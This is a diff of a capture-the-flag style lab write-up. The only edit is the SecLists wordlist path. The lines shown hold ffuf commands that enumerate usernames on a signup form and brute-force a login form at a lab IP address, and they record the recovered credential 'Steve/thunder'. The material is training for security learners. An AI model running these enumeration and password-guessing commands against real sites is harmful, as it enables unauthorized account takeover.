@@ -9,7 +9,7 @@ http://10.10.113.185/customers/signup
 ### Task 2.1
 
 ```shell
-ffuf -w ../../Materials/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.113.185/customers/signup -mr "username already exists"
+ffuf -w ../../Tools/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.113.185/customers/signup -mr "username already exists"
 
 echo -e "admin\nrobert\nsimon\nsteve" >> valid_usernames.txt
 ```
@@ -36,7 +36,7 @@ http://10.10.113.185/customers/login
 ### Task 3.1
 
 ```shell
-ffuf -w valid_usernames.txt:W1,../../Materials/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.113.185/customers/login -fc 200
+ffuf -w valid_usernames.txt:W1,../../Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.113.185/customers/login -fc 200
 ```
 
 > Steve/thunder
